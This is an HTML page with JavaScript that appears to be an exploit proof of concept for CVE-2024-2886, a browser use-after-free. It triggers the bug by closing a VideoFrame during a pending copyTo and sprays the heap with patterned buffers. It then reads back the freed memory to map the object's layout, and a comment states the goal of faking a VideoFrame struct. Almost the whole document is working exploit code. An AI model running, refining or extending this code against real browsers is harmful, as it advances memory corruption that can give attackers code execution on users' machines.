<!doctype html>
<html>
<head><title>q1shell</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
<div id="out"></div>
<script>
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };

async function pwn() {
    log('CVE-2024-2886 — UAF structure analysis');
    log('');

    const canvas = new OffscreenCanvas(64, 64);
    const gl = canvas.getContext('webgl');
    gl.clearColor(1.0, 0.0, 0.0, 1.0);
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.finish();

    // Baseline
    const frameBase = new VideoFrame(canvas, { timestamp: 0 });
    const bufBase = new Uint8Array(frameBase.allocationSize());
    await frameBase.copyTo(bufBase);
    frameBase.close();
    log('[baseline] first 32 bytes:');
    log('  ' + Array.from(bufBase.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
    log('[baseline] size: ' + bufBase.length);
    log('');

    // Test 1: spray with 0xBB - do we get 0xBB back?
    {
        gl.clearColor(1.0, 0.0, 0.0, 1.0);
        gl.clear(gl.COLOR_BUFFER_BIT);
        gl.finish();
        const frame = new VideoFrame(canvas, { timestamp: 1000 });
        const buf = new Uint8Array(frame.allocationSize());
        const p = frame.copyTo(buf);
        frame.close();
        const spray = [];
        for (let i = 0; i < 500; i++) { const s = new Uint8Array(512); s.fill(0xBB); spray.push(s); }
        await p;
        spray.length = 0;
        log('[spray=0xBB] first 32 bytes:');
        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
        const hasBB = buf.slice(0,32).some(b => b === 0xBB);
        log('  contains 0xBB: ' + hasBB);
    }

    log('');

    // Test 2: spray with 0xCC
    {
        gl.clearColor(1.0, 0.0, 0.0, 1.0);
        gl.clear(gl.COLOR_BUFFER_BIT);
        gl.finish();
        const frame = new VideoFrame(canvas, { timestamp: 2000 });
        const buf = new Uint8Array(frame.allocationSize());
        const p = frame.copyTo(buf);
        frame.close();
        const spray = [];
        for (let i = 0; i < 500; i++) { const s = new Uint8Array(512); s.fill(0xCC); spray.push(s); }
        await p;
        spray.length = 0;
        log('[spray=0xCC] first 32 bytes:');
        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
        const hasCC = buf.slice(0,32).some(b => b === 0xCC);
        log('  contains 0xCC: ' + hasCC);
    }

    log('');

    // Test 3: spray with structured data - fake a pointer-like pattern
    // If we can control specific offsets we can fake a VideoFrame struct
    {
        gl.clearColor(1.0, 0.0, 0.0, 1.0);
        gl.clear(gl.COLOR_BUFFER_BIT);
        gl.finish();
        const frame = new VideoFrame(canvas, { timestamp: 3000 });
        const buf = new Uint8Array(frame.allocationSize());
        const p = frame.copyTo(buf);
        frame.close();

        // Spray with incrementing pattern so we can see exact offsets
        const spray = [];
        for (let i = 0; i < 500; i++) {
            const s = new Uint8Array(512);
            for (let j = 0; j < 512; j++) s[j] = j & 0xFF; // 0x00..0xFF pattern
            spray.push(s);
        }
        await p;
        spray.length = 0;

        log('[spray=0x00..FF] first 64 bytes:');
        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
        log('  ' + Array.from(buf.slice(32, 64)).map(x=>x.toString(16).padStart(2,'0')).join(' '));

        // What offset in the spray pattern did copyTo read from?
        const firstByte = buf[0];
        log('  first byte 0x' + firstByte.toString(16) + ' -> spray offset ~0x' + firstByte.toString(16));
    }

    log('');

    // Test 4: no spray at all — what do we get?
    {
        gl.clearColor(1.0, 0.0, 0.0, 1.0);
        gl.clear(gl.COLOR_BUFFER_BIT);
        gl.finish();
        const frame = new VideoFrame(canvas, { timestamp: 4000 });
        const buf = new Uint8Array(frame.allocationSize());
        const p = frame.copyTo(buf);
        frame.close();
        // No spray - what's naturally at that address?
        await p;
        log('[no spray] first 32 bytes:');
        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
    }

    log('');
    log('Analysis done. Compare patterns to understand freed object structure.');
}

pwn();
</script>
</body>
</html>
